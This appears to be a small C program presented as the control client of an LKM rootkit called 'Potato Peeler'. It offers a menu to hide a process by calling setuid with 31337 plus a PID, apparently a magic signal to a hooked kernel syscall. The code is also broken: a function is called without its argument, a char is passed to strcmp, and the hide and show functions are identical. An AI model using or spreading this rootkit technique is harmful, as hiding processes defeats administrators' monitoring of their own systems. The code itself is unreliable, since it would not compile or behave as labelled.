#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void HidePID(int PID){
	int process_id;
	scanf("%d", &process_id);
	setuid(31337 + process_id);
}

void ShowPID(int PID){
	int process_id;
	scanf("%d", &process_id);
        setuid(31337 + process_id);
}

int main(){
	printf("--- Potato Peeler ---\n--- A LKM Rootkit ---\n(1) Hide Process\n(2) Exit");
	char choice = getchar();
	if(strcmp(choice, "1") == 0){
		HidePID();
	}
	return 0;
}
